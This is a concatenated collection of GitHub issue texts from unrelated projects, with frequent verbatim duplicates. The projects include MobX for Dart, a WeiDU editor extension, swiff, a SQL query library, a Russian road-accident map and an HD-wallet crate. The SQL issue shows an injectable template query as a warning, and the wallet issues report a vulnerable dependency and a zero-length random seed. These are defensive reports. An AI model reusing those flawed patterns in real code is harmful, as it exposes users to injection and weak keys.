
  Timer _timer;

  @action
  void start() {
    _timer = Timer.periodic(Duration(seconds: 1), (Timer timer) {
      if (current < 1) {
        timer.cancel();
        runInAction(() {
          shouldReset = true;
          current = _totalSeconds;
        });
      } else {
        current--;

        runInAction(() {
          shouldReset = false;
        });
      }
    });
  }

  @override
  void dispose() {
    _timer.cancel();
    super.dispose();
  }
}


``` This is related to #113  .  As a novice, it's not clear to me how to integrate streams using MobX.

The samples provided typically return a `Future<List>`- but things like FireStore often return a `Future<Stream<List>>`.

How should I structure my mobx application to use Streams? Should I just use a StreamBuilder? minimum example:
```dart
class FooWidget extends StatelessWidget {
  @override
  Widget build(BuildContext context) =>
      Observer(builder: (context) => throw Exception());
}
```

I believe this to be because `ReactiveContext.trackDerivation` (called by `ReactionImpl.track`) stores the `Exception`. This eventually leads to `ReactionImpl._reportException` which may or may not throw. If it does throw, the same problem as in #197 occurs. If it _doesn't_, `Observer` builds with `built = null`, it seems that in debug mode at least, the latter happens. As discussed on gitter.
Here's the conversation:

>Is there any mean using mobx to warn users of an `@observable` is used outside of a >Reaction/Observer?
>
>It can be quite difficult to see that we forgot watching the store.


>Pavan Podila @pavanpodila 14:12
>Not the reads but writes are protected
>Reads do not affect the consistency of the reactive system

>Remi Rousselet @rrousselGit 14:15
>It's more about catching bugs.
>
>There are many scenarios in Flutter where we can loose reactivity due to a mistake
>
>Something as simple as:
>
>```dart
>Store myStore;
>
>Widget build(BuildContext context) {
>  return AnotherWidget(foo: myStore);
>}
>```
>
> may be bugged, because AnotherWidget may not expect foo to be reactive and therefore not use an Observer.
> 
> Similarly builders are misleading:
> 
> ```dart
> Store myStore;
> 
> Widget build(BuildContext context) => Observer(builder: (_) {
>  return ListView.builder(
>    builder: (context) => Text(myStore.text),
>  ); 
>});
>```
>
>That looks fine, but the Text do not watch changes on myStore.text.


> Michael @smiLLe 14:28
@rrousselGit "may be bugged, because AnotherWidget may not expect foo to be reactive and therefore not use an Observer.” But this has always been a problem with mobx, for example in react

> Remi Rousselet @rrousselGit 14:32
I'm not saying the opposite. I'm just asking if there's a potential solution. 
A setting to prevent reading `@observable` outside of `@action`/Reaction/Observer could solve the issue.

> Michael @smiLLe 14:32
i like the idea

> Pavan Podila @pavanpodila 17:51
That is definitely an interesting thought and worth exploring. I think this is definitely doable, but needs to go behind a setting for sure
Btw we do this already for writes Can start from 0.0.1 version to current Are there any examples for updating a store within another store? I have a MainStore and SignupStore I want to update field in MainStore. What is the correct approach? should I pass a reference of MainStore to the SignupStore? Or should I will put the SignupStore inside the MainStore? Hello!
My Issue is about Store usage inside reaction. Look, I have two stores - MainScreenStore and CommonFragmentStore. Attention to MainScreenStore: from the scratch, everything works fine  - actions updates Observables, then Observers redraws related Widgets. BUT when I add some reaction, connected with MainScreenStore, inside CommonFragmentStore, nothing works about MainScreenStore (actions are called, they tries to update Observables, but nothing happens about redrawing). To clarity, some code below:

```class MainScreenStore = MainScreenStoreBase with _$MainScreenStore;

abstract class MainScreenStoreBase implements Store {

  @observable
  double bottomBarPosition = 0.0;

  @observable
  Widget fragment = CommonFragment();

  @action
  void updateBottomBarPosition(double progress) {
    bottomBarPosition = (1 - progress) * MIN_BOTTOM_BAR_POSITION;
    print(bottomBarPosition);
  }

  @action
  void changeScreen(int screen) {
    print(this.hashCode);
    switch (screen) {
      case 0:
        fragment = BattleFragment();
        break;
      case 1:
        fragment = CommonFragment();
        break;
      case 2:
        fragment = ProfileFragment();
        break;
    }
  }

}

abstract class _CommonFragmentStoreBase implements Store {

  @observable
  Color currentColor = currentTheme.primaryColor;

  @observable
  int dotsValue = 100;

  @observable
  double progress = 1;

  void initReactions() {
    autorun((_){
      injector.get<MainScreenStore>().updateBottomBarPosition(progress);
    });
  }
}
```
 I just passed hours trying to find what caused this exception: 
```
The following MobXCaughtException was thrown building Observer(dirty, state: _ObserverState#fdb5a):
MobXCaughtException: Instance of 'MobXException'

User-created ancestor of the error-causing widget was: 
  Column file:///Users/fabiobiola/Documents/Flutter/project/lib/src/field_list/widget.dart:31:16
When the exception was thrown, this was the stack: 
#0      _ObserverState.build (package:flutter_mobx/src/observer.dart:71:7)
#1      StatefulElement.build (package:flutter/src/widgets/framework.dart:4047:27)
#2      ComponentElement.performRebuild (package:flutter/src/widgets/framework.dart:3941:15)
#3      Element.rebuild (package:flutter/src/widgets/framework.dart:3738:5)
#4      BuildOwner.buildScope (package:flutter/src/widgets/framework.dart:2348:33)
...
```

Using the debugger I was able to find that the real issue message in my case was:
```
Computed values are not allowed to cause side effects by changing observables that are already being observed. Tried to modify: ObservableList<FieldGroup>@22
```

I think that this error message should be printed instead of `Instance of 'MobXException'` consider to generated files to be in folder like gen/ or something like that because for 2 or 3 files it looks ok but if we had 30-40 files it becomes clumsy in a single folder My dependent version:
```yaml
dependencies:
mobx: 0.2.1+1
flutter_mobx: 0.2.3+1

dev_dependencies:
mobx_codegen: 0.2.1+2
build_runner: 1.5.2
```
I create a Store:
```dart
import 'package:mobx/mobx.dart';

part 'counter.g.dart';

class Counter = CounterBase with _$Counter;

final Counter counter = Counter();

abstract class CounterBase with Store {
 @observable
 int count = 0;

 @action
 void add() {
  count++;
 }
}
```
When I want to see where this method is used by Ctrl+left mouse button, it doesn't work:
![image](https://user-images.githubusercontent.com/37101820/59834472-a2e94300-937a-11e9-98ba-607dcac9f2dd.png)

If you replace `abstract class CounterBase implements Store` with `abstract class CounterBase with Store` it is normal
But using implements will get an error:
![image](https://user-images.githubusercontent.com/37101820/59834905-5e11dc00-937b-11e9-893b-ea2d90140fa9.png)
Even if I add the following code:
```dart
@override
void dispose() {}
```
This does not generate a `.g` file

So I want to confirm that the `0.2.1+1` version can only use `xxx with Store`, and the method can't jump? Is there a solution?
 Just a passing thought, but I was wondering if `mobx` might be amenable to a `mobx_test` package that provides custom matchers for observables? I'm taking inspiration from Stream Matchers, here: https://pub.dartlang.org/packages/test#stream-matchers

For example, say you want to verify that an observable emits two states in response to an action, it might be coo to have something like (pseudocode warning, might not be 100% right, but to get the idea across!):

```dart
test('My action updates the observable in a specific way', () {
  final myObservable = Observable<int>(0);
  void myAction() async {
    runInAction(() {
      myObservable.value = 1;
    });

   final result = await fetchInt(); // mock this to return "2"

   runInAction(() {
    myObservable.value = result;
   });
  }

  scheduleMicrotask(() { 
    myAction();
  });
  
  // The `notifiesInOrder` would be a custom test matcher exported from the mobx_test package
  expect(myObservable.value, notifiesInOrder([1, 2]));
});
```

This can be really handy when it comes to testing logic, especially if you want the Observable to be in an expected state in response to an API or async call. An example of test where I use this for the bloc pattern and really like the approach:

https://github.com/brianegan/github_search_angular_flutter/blob/master/github_search_common/test/ui/search_bloc_test.dart

Potential matchers, using `notifies` in place of `emit`, but naming is just for demonstration and open to feedback:

  * notifies
  * notifiesInOrder
  * notifiesAnyOf
  * neverNotifies (not sure if observables have a done event?)
  * notifiesDone (not sure if observables have a done event?)

Update, I think this could help your own tests as well! E.g.  this kinda stuff here:

```
  final values = <int>[];
      autorun((_) {
        values.add(counter.value);
      });
```

We used to do this EXACT same thing in RxDart before StreamMatchers were available, and they really clean up the testing code. Something like this:
`Missing "part 'nesting_translate_mode.g.dart';".`

It's a result of this commit: https://github.com/mobxjs/mobx.dart/commit/4f75008c647193eca1367951629534fb0e7e3e31

I'm looking at it now. Hi guys.
I have a `TextField `in my screen. The `store `fetches data from an Api. And to set the data to the `TextField `I am doing it like this:

                     Observer(
                          builder: (context) {
                            _servingQuantityController.text = store.servingQuantity;
                            return TextField(
                              controller: _servingQuantityController,
                              keyboardType: TextInputType.number,
                              style: TextStyle(fontWeight: FontWeight.bold),
                              decoration: InputDecoration(
                                border: UnderlineInputBorder(
                                  borderSide: BorderSide(color: Colors.grey),
                                ),
                              ),
                              onSubmitted: (val) =>
                                  store.setServingQuantity(val),
                            );
                          },
                        )

This does work, but the cursor moves to the beginning whenever I click it. Is there any other way to do this I mentioned a few topics regarding integration with @rrousselGit [flutter_hooks](https://github.com/rrousselGit/flutter_hooks) package, e.g.
* https://github.com/rrousselGit/flutter_hooks/issues/83
* Flutter hooks integration
* 

Some of them are already closed, others are still open, I am not well oriented in them. 

What is the final decision on this integration? I have an instance of ChildStore inside ParentStore, and the ChildStore is initialised from the ParentStore. I want to react to the changes in ChildStore observers in the ParentStore. My question is:
1 - Is this possible?
2- If possible, then what would be the correct reaction to use.

ParentStore.dart

`abstract class _ParentStore implements Store {

  // store for handling tasks
   ChildStore childStore = ChildStore();

//need a reaction observe childStore.valueToObserve
}`

ChildStore.dart
`abstract class _ChildStore implements Store {

  @observable
int valueToObserve = 0;
}` I heard at Google I/o it  can provide anything to widget tree... It seems counter-productive and unintuitive to have a runtime exception when calling a setter on an @observable and ask people to write custom setFoo @action methods when the setter on the @observable is already being generated and can produce the correct @action behavior. Possibly consider using the [gatsby-starter-docs](https://github.com/ericwindmill/gatsby-starter-docs) as a template ![image](https://user-images.githubusercontent.com/11290701/64475261-0a14d780-d1b3-11e9-8792-06586dbb577d.png)
![image](https://user-images.githubusercontent.com/11290701/64475264-17ca5d00-d1b3-11e9-8fee-b200393068b9.png)

After changing the color, the interface can't change the color in real time, but the simple counter works fine.
<---------->
162173980
Need to add automatic colorization for sfall defines. Maybe RP, too. The following **ACTION/PATCH** functions are missing:

- `ADD_ITEM_EQEFFECT`
- `ADD_ITEM_EFFECT`
- `ADD_SPELL_EFFECT`
- `ADD_SPELL_CFEFFECT` OK, latest version (v1.0.5) - I noticed that "detail" (from [weidu.completion.yml](https://github.com/BGforgeNet/vscode-bgforge-mls/blob/master/server/out/weidu.completion.yml)) no longer shows up upon hovering over a specific tp2-action/flag/whatever.

For instance, if you hover over `ACTION_IF`, then you'll only see its documentation but not the following => `ACTION_IF value THEN BEGIN TP2 Action list END [ ELSE BEGIN TP2 Action list END ]` The following **PATCH** functions are missing:

- `ADD_ITEM_EQEFFECT`
- `ADD_ITEM_EFFECT`
- `ADD_SPELL_EFFECT`
- `ADD_SPELL_CFEFFECT` OK, latest version (v1.0.5) - I noticed that "detail" (from [weidu.completion.yml](https://github.com/BGforgeNet/vscode-bgforge-mls/blob/master/server/out/weidu.completion.yml)) no longer shows up upon hovering over a specific tp2-action/flag/whatever.

For instance, if you hover over `ACTION_IF`, then you'll only see its documentation but not the following => `ACTION_IF value THEN BEGIN TP2 Action list END [ ELSE BEGIN TP2 Action list END ]` Pretty much what the title states.
Autocompletion should suggest all the constants listed in section 15 (WeiDU constants) of the official documentation. For example, it should suggest `INT_VAR`, `RET`, `STR_VAR`, `opcode`, `parameter1`, `parameter2`, `target`, `duration`, `timing`, `resource`, `special`, `savingthrow`, `savebonus`, `power`, `match_opcode`, `header_type`, `match_resist_dispel`, `check_globals` and so fourth. For example:
```
// This comment is greyed out
LPF ADD_ITEM_EQEFFECT
INT_VAR
    opcode = 319    // This comment is not greyed out
     .........
END
``` Pretty much what the title states.
Autocompletion should suggest all the constants listed in section 15 (WeiDU constants) of the official documentation. See the attached screenshot for further details. Code snippet below.
```
IF
	!CheckSpellState(Myself,WIZARD_SHIELD)
THEN
	RESPONSE #100
		Spell(Myself,WIZARD_SHIELD)
END
```
<img width="514" alt="Same color" src="https://user-images.githubusercontent.com/39967126/69857359-25622100-1290-11ea-812c-f929b00afe9a.png">
 As you can see, the outer `%%` are highlighted as if they were content of the string... You could use another color to distinguish the outer pair from the inner one....

<img width="580" alt="%%variable%%" src="https://user-images.githubusercontent.com/39967126/69957101-29957500-1502-11ea-949d-a3af8c747f7c.png">
 @burner1024 

Since we're speaking of `BAF` files, I must confess that I rarely use them – I prefer to code scripts in [SSL](https://www.gibberlings3.net/forums/topic/13725-coding-scripts-in-ssl-some-lessons/), it's much more compact and versatile.

So, my question is: what do you think about adding support for this format? See the attached screenshot for further details. Code snippet below.
```
IF
	!CheckSpellState(Myself,WIZARD_SHIELD)
THEN
	RESPONSE #100
		Spell(Myself,WIZARD_SHIELD)
END
```
<img width="514" alt="Same color" src="https://user-images.githubusercontent.com/39967126/69857359-25622100-1290-11ea-812c-f929b00afe9a.png">

NOTE: This issue doesn't seem to be related to a particular Color Theme, it occurs with all of them.... As you can see, the outer `%%` are highlighted as if they were content of the string... You could use another color to distinguish the outer pair from the inner one....

<img width="580" alt="%%variable%%" src="https://user-images.githubusercontent.com/39967126/69957101-29957500-1502-11ea-949d-a3af8c747f7c.png">
 As you can see, the outer `%%` are highlighted as if they were content of the string... You could use another color to distinguish the outer pair from the inner one....

<img width="580" alt="%%variable%%" src="https://user-images.githubusercontent.com/39967126/69957101-29957500-1502-11ea-949d-a3af8c747f7c.png">
 Unlike `.tp2` files, `%variable%` references are not highlighted appropriately (i.e., you cannot distinguish them from the content of the string).

<img width="823" alt="TRA – %variable%" src="https://user-images.githubusercontent.com/39967126/69956870-83e20600-1501-11ea-9995-27ad0649a5f7.png">
 Unlike `.tp2` files, `%variable%` references are not highlighted appropriately (i.e., you cannot distinguish them from the content of the actual string).

<img width="823" alt="TRA – %variable%" src="https://user-images.githubusercontent.com/39967126/69956870-83e20600-1501-11ea-9995-27ad0649a5f7.png">
 As you can see, the outer `%%` are highlighted as if they were content of the string...

<img width="580" alt="%%variable%%" src="https://user-images.githubusercontent.com/39967126/69957101-29957500-1502-11ea-949d-a3af8c747f7c.png">
 Need to add automatic colorization for sfall defines. Maybe RP, too. Let's consider the following example:
```
LAF DELETE_SCRIPT_BLOCK
STR_VAR
	script = ~GTSUM00~
	match = EVAL "RESPONSE #100[%WNL%%LNL%%MNL%]*END"
END
```

All the code that follows this line `match = EVAL "RESPONSE #100[%WNL%%LNL%%MNL%]*END"` is highlighted in yellow (as if a string delimiter is missing).

Why!?
<img width="940" alt="Missing string delimiter ?" src="https://user-images.githubusercontent.com/39967126/63652067-63651b80-c75c-11e9-83dc-4beedcc3f661.png">

<---------->
162359404
I would love a feature where I could have multiple environments setup in the config (for example a dev environment, a staging environment and even the prod environment).
Each should have its own push and pull folders. Pushing to production isn't the safest / best thing to do so I'm thinking of adding 'are you sure' prompt before it sync up the files.
That'll make it harder to accidentally ruin your week :) When running `swiff -db` or `swiff -database` the app runs the incorrect task. I would love a feature where I could have multiple environments setup in the config (for example a dev environment, a staging environment and even the prod environment).
Each should have its own push and pull folders. This would definitely have to be in conjunction with #4, but it would be useful during initial developments of a site to push a local database to a remote environment (99% of the time, a staging server).

Currently, since multi-environments aren't supported, our staging site is configured in swiff, and we're manually uploading the local database to the staging server to let the client see incremental work. It'd be nice to know the size of the non-gzipped database after pulling it down. This would definitely have to be in conjunction with #4, but it would be useful during initial developments of a site to push a local database to a remote environment (99% of the time, a staging server).

Currently, since multi-environments aren't supported, our staging site is configured in swiff, and we're manually uploading the local database to the staging server to let the client see incremental work. When there's more than a page full of response text the menu gets pushed off the top of the screen. I have SSH running on a non-standard port and it doesn't appear that I can specify it in swiff.config.js. I'm otherwise trying to authenticate with a valid username and key. I attempted to append the port to the hostname (`foo.dev:1234`) but it resulted in the same response when I attempt a _Pull_:

> Haven’t added your key to the server?
> Add your key to the remote server with ssh-copy-id:
> ssh-copy-id foo.dev:1234 Hi, 
Using nicely with a few projects. One thing, the teal font colour on the task interface is difficult to read on a white background. Is there a way to change?

<img width="575" alt="Screenshot 2019-05-16 at 11 35 15" src="https://user-images.githubusercontent.com/2061819/57847582-b1b66600-77ce-11e9-947b-2fe0f260fca6.png"> I would love a feature where I could have multiple environments setup in the config (for example a dev environment, a staging environment and even the prod environment).
Each should have its own push and pull folders. Hi, 
Using nicely with a few projects. One thing, the teal font colour on the task interface is difficult to read on a white background. Is there a way to change?

<img width="575" alt="Screenshot 2019-05-16 at 11 35 15" src="https://user-images.githubusercontent.com/2061819/57847582-b1b66600-77ce-11e9-947b-2fe0f260fca6.png"> @ben-rogerson as discussed, it would be great to get the `--host` param added to the `mysqldump` command, when databases are located on a separate server (eg arcustech). Ctrl+C just won't cut it - let's add an easier way to close Thanks to @samstevens for this great idea.

Basically you'd be able to add additional tasks to Swiff yourself.
You'd also be able to customise the menu to show only the tasks you'd use.
Perhaps being able to `npm install -g swiff-plugin` for the more popular extensions?

Open to suggestions/ideas. There's the possibility of overwriting your local files accidentally when using the pull task. Perhaps a confirmation message would help avoid this. There's files like .DS_Store etc that don't play a part in web development. There should be some defaults ignores set and a way to customise. When there's more than a page full of response text the menu gets pushed off the top of the screen. After pulling a remote DB, I have to `Ctrl + C` to get my prompt back. I'm guessing (without checking into the source) that perhaps you're not sending the proper exit codes to the terminal after performing the DB pull, so it never knows that the task is done. We are getting a privateKey error when running the database sync:

`Error: Cannot parse privateKey: Unsupported key format`

For info, i'm on a fresh install of osx and have just added new keys and verified they are working on the remote server.

<---------->
162680648
It seems as though there might be an issue with using squid + postguard when using postgres schemas, I would assume that when referencing tables in schemas one should use the FQN of the table in the `defineTable` method but this does not seem to work as intended with postguard. 

I would expect the following to work and type check correctly, in addition it seems as postguard ignores the schema portion of table names when it checks a query

```
defineTable('schemaName.tableName`, {...})
```  There is always the risk that you might forget the `sql` tag on your template literal and thus end up with an SQL injection vulnerability like this:

```js
// forgot the `sql` tag
await database.query(`SELECT name FROM users WHERE id = ${id}`)
```

To prevent this kind of thing, let's add `sql.safe()`:

```js
// forgot the `sql` tag
await database.query(`SELECT name FROM users WHERE id = ${sql.safe(id)}`)
```

The result of `sql.safe(X)` should be an object that the `sql` tag function is able to interpret, but that is not interpretable if used in a default template string.

Might even want to add a `[Symbol.toString]` property to that object that either returns something like `"[SQL safe]"` or explicitly throws an error stating that you did not use the `sql` tag function. just like https://github.com/sweetiq/schemats or just use it. It would be useful to have a spreadUpdate/set which could be used to generate dynamic update queries in a way that handles the undefined case. 

I am currently creating Patch Types as follows and would like a easy and type safe way to use these in update queries
```
export type PatchUserRecord = Partial<TableRow<typeof usersTable>>
``` There is always the risk that you might forget the `sql` tag on your template literal and thus end up with an SQL injection vulnerability like this:

```js
// forgot the `sql` tag
await database.query(`SELECT name FROM users WHERE id = ${id}`)
```

To prevent this kind of thing, let's add `sql.safe()`:

```js
// forgot the `sql` tag
await database.query(`SELECT name FROM users WHERE id = ${sql.value(id)}`)
```

The result of `sql.value(X)` should be an object that the `sql` tag function is able to interpret, but that is not interpretable if used in a default template string.

Might even want to add a `[Symbol.toString]` property to that object that either returns something like `"[SQL value]"` or explicitly throws an error stating that you did not use the `sql` tag function. Hi, I just found this library and it looks really good! 

I just miss one feature before I can start using it for real. I want to be able to do something like:

```ts
const users = await database.query(sql`
  INSERT INTO users ${spreadInserts([
    { name: "Jon", email: "jon.snow@winterfell.com" },
    { name: "Bran", email: "bran.stark@winterfell.com" }
  ])}
`)

// Text: INSERT INTO users (name, email) VALUES (%1, %2), (%3, %4)
// Values: [ "Jon", "jon.snow@winterfell.com", "Bran", "bran.stark@winterfell.com" ]
``` 

I can submit a PR if you want. Hi, I just found this library and it looks really good! 

I just miss one feature before I can start using it for real. I want to be able to do something like:

```ts
const users = await database.query(sql`
  INSERT INTO users ${spreadInserts([
    { name: "Jon", email: "jon.snow@winterfell.com" },
    { name: "Bran", email: "bran.stark@winterfell.com" }
  ])}
`)

// Text: INSERT INTO users (name, email) VALUES (%1, %2), (%3, %4)
// Values: [ "Jon", "jon.snow@winterfell.com", "Bran", "bran.stark@winterfell.com" ]
``` 

I just looked at the source code and it does not look that hard to implement or I'm I wrong?

I'm thinking something like (I have not tested this 😉):

```ts
export function spreadInserts(records: Record<string, any>[]): SqlSpecialExpressionValue {
  const insertionValues = records.map(record => objectEntries<any>(record, true))
  return {
    type: $sqlExpressionValue,
    buildFragment(nextParamID: number) {
      return buildSpreadInsertFragments(insertionValues, nextParamID)
    }
  }
}

function buildSpreadInsertFragments(insertionValuesList: [string, any][][], nextParamID: number): QueryConfig {
  let values: any[] = []
  const text =
    `(${insertionValuesList[0].map(([columnName]) => escapeIdentifier(columnName)).join(", ")})` +
    ` VALUES ` +
    insertionValuesList.map(insertionValues => `(${insertionValues.map(([, columnValue]) => {
      const serialized = serializeSqlTemplateExpression(columnValue, nextParamID)
      values = [...values, ...serialized.values]
      nextParamID += serialized.values.length
      return serialized.text
    }).join(", ")})`).join(", ")
  return {
    text,
    values
  }
}
``` 

And then rewriting `spreadInsert` and `buildSpreadInsertFragment` to use the functions above. 

What do you think? I can submit a PR if you want.
<---------->
162721434
При активном скроллинге по карте, отдалении и приближении в какой-то момент начинает зависать карта и появляются ошибки `Uncaught DOMException: Failed to execute 'drawImage' on 'CanvasRenderingContext2D': The image argument is a canvas element with a width or height of 0.`.
 Добавить центрирование по геопозиции, которое активировалось бы нажатием кнопки на карте. OS: **GNU/Linux Debian 9**
Python: **3.6**
Django: **2.1.5**

Error:
```
Traceback (most recent call last):
  File "./parser.py", line 15, in <module>
    locale.setlocale(locale.LC_TIME, "ru_RU")
  File "/usr/local/lib/python3.6/locale.py", line 598, in setlocale
    return _setlocale(category, locale)
locale.Error: unsupported locale setting
``` Речь про `dtpmap/settings.py`

```
with open('dtpmap/etc/database.txt') as f:
    database_name, database_user, database_password = f.read().strip().split(" ")
```
Предлагаю добавить `database_host`, `database_port` для гибкости. И вообще база должна быть на другом хосте, необязательно физическом, конечно.
Тогда мы сможем проще решить автосборки проекта и разворачивания тестовой среду для разработчиков (я про контейнеризацию #16 ). Добавить на главной странице подсказку со ссылкой на регион/город, откуда зашел пользователь, чтобы упростить и ускорить ему доступ к его региону (не нужно будет вводить текст в поиск). Регион и город можно определять по ip. При активации определенных фильтров, смене масштаба и скроллингу по карте нужно отражать эти действия в ссылке, чтобы ее можно скопировать и поделиться. Переход по этой ссылке также должен считываться приложением и активировать нужные фильтры, менять масштаб и центрировать карту по координатам. Добавить возможность оставлять комментарии под любым ДТП. Это нужно, если кто-то захочет добавить ссылку на видео или еще что-то про ДТП.

Поля: имя, комментарий и капча. 
Пока без модерирования, пусть комментарии мгновенно публикуются. У нас вообще нет тестов. Давайте их сделаем. У нас вообще нет тестов. Давайте их сделаем. Нужно обновить карточки ДТП, которые обновились на сайте ГУБДД
Например, https://dtp-stat.ru/dtp/207472054/.
>Мерседес представительского класса с номерами серии АМР сбил насмерть сотрудника ГИБДД.
Карточка ДТП пустая, а на сайте после нашей жалобы появились данные о погибшем.

Предлагаю помечать ДТП, в которых скрылся водитель или ТС, как нарушение ПДД: "скрылся с места аварии" For deployment in simple (single instance) mode project may have a Dockerfile or another tool. 

I think, that Docker is good choice, because Docker is very popular and give a lowers entry threshold. 
  Упростить и объединить формулировки типов дтп и нарушений ПДД
Например, можно объединить всех лиц не участников движения в пешеходов. Project must have a some quickstart guide for local development. 

This guide helps to run project on local machine and lowers the threshold for new developers. ./parser.py get_dtp
```
Traceback (most recent call last):
  File "./parser.py", line 140, in <module>
    main(sys.argv)
  File "./parser.py", line 136, in main
    load(args[1:])
  File "./parser.py", line 124, in load
    get_dtp()
  File "./parser.py", line 105, in get_dtp
    update_dtp.main()
  File "/root/dtp-stat/dtp_parser2/update_dtp.py", line 253, in main
    with open("data/dtp.json", 'r') as f:
FileNotFoundError: [Errno 2] No such file or directory: 'data/dtp.json'
(env) root@dtp-stat:~/dtp-stat# ./parser.py get_data
(env) root@dtp-stat:~/dtp-stat# cp ../dtp.json data/
(env) root@dtp-stat:~/dtp-stat# ./parser.py get_data
(env) root@dtp-stat:~/dtp-stat# ./parser.py get_dtp
0it [00:00, ?it/s]
Traceback (most recent call last):
  File "/root/dtp-stat/env/lib/python3.6/site-packages/django/db/backends/utils.py", line 85, in _execute
    return self.cursor.execute(sql, params)
psycopg2.DataError: unsupported Unicode escape sequence
LINE 1: ...333, "conditions" = '["\u0414\u043e\u0436\u0434\u044c", "\u0...
                                                             ^
DETAIL:  Unicode escape values cannot be used for code point values above 007F when the server encoding is not UTF8.
CONTEXT:  JSON data, line 1: [...
``` Нужно добавить на карту слой "Подземные переходы"
Включается галочкой после "⚫ - велосипеды"
https://data.mos.ru/opendata/7701236617-peshehodnye-tonneli
 For deployment in simple (single instance) mode project may have a Dockerfile or another tool. 

I think, that Docker is good choice, because Docker is very popular and give a lowers entry threshold. 
 I think, that parser have some problems like:

- magic constants: https://github.com/tadata-ru/dtp-stat/blob/0b6cf3804f9753aec122aa66a6a534de0cf6a65d/dtp_parser/update_dtp.py#L85 
- not optimal upsert/get_or_create and other db operations https://github.com/tadata-ru/dtp-stat/blob/0b6cf3804f9753aec122aa66a6a534de0cf6a65d/dtp_parser/update_dtp.py#L109-L115
https://github.com/tadata-ru/dtp-stat/blob/0b6cf3804f9753aec122aa66a6a534de0cf6a65d/dtp_parser/update_dtp.py#L156
- unsafe JSON construction https://github.com/tadata-ru/dtp-stat/blob/0b6cf3804f9753aec122aa66a6a534de0cf6a65d/dtp_parser/update_dtp.py#L244 and url construction https://github.com/tadata-ru/dtp-stat/blob/0b6cf3804f9753aec122aa66a6a534de0cf6a65d/dtp_parser/update_regions.py#L29
- work without timeouts https://github.com/tadata-ru/dtp-stat/blob/0b6cf3804f9753aec122aa66a6a534de0cf6a65d/dtp_parser/update_regions.py#L79
- and some other problems (code style, untestable code)

Before rewriting parser we must do refactoring and may be write tests.
 Project must have a some quickstart guide for local development. 

This guide helps to run project on local machine and lowers the threshold for new developers. Общепринятой практикой считается не вносить пакеты в  requirements.txt вручную, а использовать для этого команду pip freeze > requirements.txt . Но в любом случае очень желательно помимо названий пакетов указывать также и используемые версии. Например, django какой версии у вас на сервере? По коду видно что начинали с django 1.11, а сейчас похоже уже 2.1 .
<---------->
162728724
The actual version of the project is pointing to `ring = "0.14.0"` which has a dependency to `spin = "0.5.0"` and this version has a vulnerability problem.
https://github.com/jjyr/hdwallet/blob/master/Cargo.toml#L20

It's possible to update the ring to `ring = "0.16.9"` which is using the `spin = "0.5.2"`
https://github.com/briansmith/ring/blob/master/Cargo.toml#L307

```shell
error: Vulnerable crates found!

ID:	 RUSTSEC-2019-0013
Crate:	 spin
Version: 0.5.0
Date:	 2019-08-27
URL:	 https://github.com/mvdnes/spin-rs/issues/65
Title:	 Wrong memory orderings in RwLock potentially violates mutual exclusion
Solution: upgrade to: >= 0.5.2
``` The key should be changed to extended_key. Otherwise, it will fail to compile. 
`    let (extended_key, derivation) = key_chain.derive_private_key("m/1H/0".into()).expect("derive ExtendedPrivKey");
`
`
    let key = BitcoinPrivKey {
        network: BitcoinNetwork::MainNet,
        derivation,
        extended_key,
    };
` The key should be changed to extended_key. Otherwise, it will fail to compile. 
`
    let (extended_key, derivation) = key_chain.derive_private_key("m/1H/0".into()).expect("derive ExtendedPrivKey");
    let key = BitcoinPrivKey {
        network: BitcoinNetwork::MainNet,
        derivation,
        extended_key,
    };
` The actual version of the project is pointing to `ring = "0.14.0"` which has a dependency to `spin = "0.5.0"` and this version has a vulnerability problem.
https://github.com/jjyr/hdwallet/blob/master/Cargo.toml#L20

It's possible to update the ring to `ring = "0.16.9"` which is using the `spin = "0.5.2"`
https://github.com/briansmith/ring/blob/master/Cargo.toml#L307

```shell
error: Vulnerable crates found!

ID:	 RUSTSEC-2019-0013
Crate:	 spin
Version: 0.5.0
Date:	 2019-08-27
URL:	 https://github.com/mvdnes/spin-rs/issues/65
Title:	 Wrong memory orderings in RwLock potentially violates mutual exclusion
Solution: upgrade to: >= 0.5.2
``` `seed` in:

https://github.com/jjyr/hdwallet/blob/c86ed6a2e35090cc8ca405bf26fd04fec89925ba/src/key.rs#L46-L55

is a 0-lenght `Vec`, `rng.fill(seed.as_mut_slice());` is a noop (you get a mutable 0-size slice).

Proper approach is to use a zero-ed vector (`vec![0; len]`) or after creating a `Vec` with capacity to use the unsafe `set_len` (although you have to make sure the bytes aren't being read, as it opens you up to potential memory exploits if they are). `seed` in:

https://github.com/jjyr/hdwallet/blob/c86ed6a2e35090cc8ca405bf26fd04fec89925ba/src/key.rs#L46-L55

is a 0-lenght `Vec`, `rng.fill(seed.as_mut_slice());` is a noop (you get a mutable 0-size slice).

Proper approach is to use a zero-ed vector (`vec![0; len]`) or after creating a `Vec` with capacity to use the unsafe `set_len` (although you have to make sure the bytes aren't being read, as it opens you up to potential memory exploits if they are).
<---------->
162729160
**Is your feature request related to a problem? Please describe.**
Currently the RPC requests are handled very poorly with `if` and `else if`

Offending files:
- https://github.com/plasma-group/plasma-chain-operator/blob/master/src/server.js
- https://github.com/plasma-group/plasma-chain-operator/blob/master/src/state-manager/app.js
- https://github.com/plasma-group/plasma-chain-operator/blob/master/src/block-manager/app.js

**Describe the solution you'd like**
Change it to look like b-coin This is essentially a clone of the issue https://github.com/plasma-group/plasma-prime/issues/4  Create a mock node which signs a bunch of dummy transactions and pumps them into the state object. These nodes will not be checking history but instead relying on the operator being honest. **Is your feature request related to a problem? Please describe.**
Users will almost certainly attempt to deploy a Plasma Chain before having enough ETH to pay for gas. This will confuse them!

**Describe the solution you'd like**
There should be a message like:

```
NOT ENOUGH MONEY!

You can get some testnet ETH here: [insert link which explains how to get testnet eth]

F~~~U~~~N~~~MAGIC EMOJIIIIIsssszzz
```

**Describe alternatives you've considered**
A clear and concise description of any alternative solutions or features you've considered.

**Additional context**
Add any other context or screenshots about the feature request here.
 **Is your feature request related to a problem? Please describe.**
Currently some defaults in the config are set here:
https://github.com/plasma-group/plasma-chain-operator/blob/master/src/utils.js#L148-L163

**Describe the solution you'd like**
This should be replaced with 1) object.assign, and 2) a "default" config file which exists in an actual file somewhere in the repo, similar to https://github.com/plasma-group/plasma-chain-operator/blob/master/test/config-test.json **Is your feature request related to a problem? Please describe.**
It would be nice if the operator intelligently detected deposits & stopped providing history proofs after it sees a deposit immediately proceeds a transaction.

**Describe the solution you'd like**
Record the deposits as they come in in the history manager. Then before checking branches maybe check for deposits...? Ugh this will be a little annoying...  **Is your feature request related to a problem? Please describe.**
